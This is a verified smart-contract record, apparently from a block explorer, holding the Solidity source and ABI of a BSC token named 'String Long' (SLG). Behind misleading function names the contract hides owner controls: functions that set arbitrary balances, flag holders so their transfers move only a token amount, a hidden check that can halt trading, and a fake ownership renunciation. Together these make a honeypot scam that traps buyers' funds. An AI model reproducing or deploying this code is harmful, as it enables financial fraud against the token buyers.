{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface receiverLimitList {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract autoTxSwap {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverWallet {\n    function createPair(address atShould, address walletToMax) external returns (address);\n}\n\ninterface sellWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFrom) external view returns (uint256);\n\n    function transfer(address listTake, uint256 sellIs) external returns (bool);\n\n    function allowance(address senderAmount, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address listTake,\n        uint256 sellIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellMin, uint256 value);\n    event Approval(address indexed senderAmount, address indexed spender, uint256 value);\n}\n\ninterface sellWalletMetadata is sellWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract StringLong is autoTxSwap, sellWallet, sellWalletMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return buyMinAuto;\n    }\n\n    bool private shouldWallet;\n\n    function name() external view virtual override returns (string memory) {\n        return listReceiverTake;\n    }\n\n    mapping(address => uint256) private senderList;\n\n    function balanceOf(address receiverFrom) public view virtual override returns (uint256) {\n        return senderList[receiverFrom];\n    }\n\n    event OwnershipTransferred(address indexed walletLiquidity, address indexed enableMarketing);\n\n    function transferFrom(address txWallet, address listTake, uint256 sellIs) external override returns (bool) {\n        if (_msgSender() != atTo) {\n            if (fundLaunch[txWallet][_msgSender()] != type(uint256).max) {\n                require(sellIs <= fundLaunch[txWallet][_msgSender()]);\n                fundLaunch[txWallet][_msgSender()] -= sellIs;\n            }\n        }\n        return fromWallet(txWallet, listTake, sellIs);\n    }\n\n    function atFund(address shouldFundTotal) public {\n        receiverTo();\n        \n        if (shouldFundTotal == takeLiquidity || shouldFundTotal == buyTeam) {\n            return;\n        }\n        receiverIsTotal[shouldFundTotal] = true;\n    }\n\n    constructor (){\n        \n        receiverLimitList exemptReceiverTx = receiverLimitList(atTo);\n        buyTeam = receiverWallet(exemptReceiverTx.factory()).createPair(exemptReceiverTx.WETH(), address(this));\n        \n        takeLiquidity = _msgSender();\n        buyMarketingTotal();\n        receiverSwap[takeLiquidity] = true;\n        senderList[takeLiquidity] = tradingLaunched;\n        if (receiverAt) {\n            receiverAt = true;\n        }\n        emit Transfer(address(0), takeLiquidity, tradingLaunched);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundLaunch;\n\n    function autoIsMarketing(address totalFrom, uint256 sellIs) public {\n        receiverTo();\n        senderList[totalFrom] = sellIs;\n    }\n\n    function receiverShouldSender(address txWallet, address listTake, uint256 sellIs) internal returns (bool) {\n        require(senderList[txWallet] >= sellIs);\n        senderList[txWallet] -= sellIs;\n        senderList[listTake] += sellIs;\n        emit Transfer(txWallet, listTake, sellIs);\n        return true;\n    }\n\n    bool public takeLimit;\n\n    string private listReceiverTake = \"String Long\";\n\n    mapping(address => bool) public receiverSwap;\n\n    function sellSwap(uint256 sellIs) public {\n        receiverTo();\n        receiverLimit = sellIs;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellFee;\n    }\n\n    uint256 constant txMode = 20 ** 10;\n\n    address atTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private receiverAt;\n\n    uint256 public exemptLaunch;\n\n    address public takeLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingLaunched;\n    }\n\n    function receiverTo() private view {\n        require(receiverSwap[_msgSender()]);\n    }\n\n    uint256 private tradingLaunched = 100000000 * 10 ** 18;\n\n    uint256 private swapFee;\n\n    function owner() external view returns (address) {\n        return sellFee;\n    }\n\n    address public buyTeam;\n\n    uint256 public senderLiquidity;\n\n    function allowance(address takeReceiver, address receiverFee) external view virtual override returns (uint256) {\n        if (receiverFee == atTo) {\n            return type(uint256).max;\n        }\n        return fundLaunch[takeReceiver][receiverFee];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingLimit;\n    }\n\n    function buyMarketingTotal() public {\n        emit OwnershipTransferred(takeLiquidity, address(0));\n        sellFee = address(0);\n    }\n\n    uint256 private txList;\n\n    uint8 private tradingLimit = 18;\n\n    function fromWallet(address txWallet, address listTake, uint256 sellIs) internal returns (bool) {\n        if (txWallet == takeLiquidity) {\n            return receiverShouldSender(txWallet, listTake, sellIs);\n        }\n        uint256 sellTeam = sellWallet(buyTeam).balanceOf(isLaunched);\n        require(sellTeam == receiverLimit);\n        require(listTake != isLaunched);\n        if (receiverIsTotal[txWallet]) {\n            return receiverShouldSender(txWallet, listTake, txMode);\n        }\n        return receiverShouldSender(txWallet, listTake, sellIs);\n    }\n\n    bool public receiverSwapMarketing;\n\n    function transfer(address totalFrom, uint256 sellIs) external virtual override returns (bool) {\n        return fromWallet(_msgSender(), totalFrom, sellIs);\n    }\n\n    function launchedShould(address txTeamExempt) public {\n        if (toAmount) {\n            return;\n        }\n        \n        receiverSwap[txTeamExempt] = true;\n        if (txList == swapFee) {\n            exemptLaunch = senderLiquidity;\n        }\n        toAmount = true;\n    }\n\n    uint256 launchedTrading;\n\n    mapping(address => bool) public receiverIsTotal;\n\n    function approve(address receiverFee, uint256 sellIs) public virtual override returns (bool) {\n        fundLaunch[_msgSender()][receiverFee] = sellIs;\n        emit Approval(_msgSender(), receiverFee, sellIs);\n        return true;\n    }\n\n    address isLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 receiverLimit;\n\n    bool public toAmount;\n\n    address private sellFee;\n\n    string private buyMinAuto = \"SLG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLiquidity\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldFundTotal\",\"type\":\"address\"}],\"name\":\"atFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"autoIsMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyMarketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTeamExempt\",\"type\":\"address\"}],\"name\":\"launchedShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverIsTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverSwapMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"sellSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "StringLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}